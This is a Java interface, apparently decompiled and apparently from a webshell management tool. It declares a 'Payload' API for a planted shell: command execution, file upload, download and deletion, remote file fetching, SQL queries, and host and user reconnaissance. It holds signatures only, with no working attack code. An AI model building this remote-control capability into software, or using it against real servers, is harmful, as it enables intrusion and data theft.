package core.imp;

import core.shell.ShellEntity;
import java.util.Map;
import util.http.ReqParameter;

public interface Payload {
  void init(ShellEntity paramShellEntity);
  
  byte[] getPayload();
  
  String getFile(String paramString);
  
  String[] listFileRoot();
  
  byte[] downloadFile(String paramString);
  
  String getOsInfo();
  
  String getBasicsInfo();
  
  boolean include(String paramString, byte[] paramArrayOfbyte);
  
  void fillParameter(String paramString1, String paramString2, ReqParameter paramReqParameter);
  
  byte[] evalFunc(String paramString1, String paramString2, ReqParameter paramReqParameter);
  
  String execCommand(String paramString);
  
  boolean uploadFile(String paramString, byte[] paramArrayOfbyte);
  
  boolean copyFile(String paramString1, String paramString2);
  
  boolean deleteFile(String paramString);
  
  boolean moveFile(String paramString1, String paramString2);
  
  boolean newFile(String paramString);
  
  boolean newDir(String paramString);
  
  boolean test();
  
  boolean fileRemoteDown(String paramString1, String paramString2);
  
  boolean setFileAttr(String paramString1, String paramString2, String paramString3);
  
  boolean close();
  
  String execSql(String paramString1, String paramString2, int paramInt, String paramString3, String paramString4, String paramString5, Map paramMap, String paramString6);
  
  String[] getAllDatabaseType();
  
  String currentDir();
  
  String currentUserName();
  
  String bigFileUpload(String paramString, int paramInt, byte[] paramArrayOfbyte);
  
  String getTempDirectory();
  
  byte[] bigFileDownload(String paramString, int paramInt1, int paramInt2);
  
  int getFileSize(String paramString);
  
  boolean isWindows();
  
  boolean isAlive();
  
  boolean isX64();
}
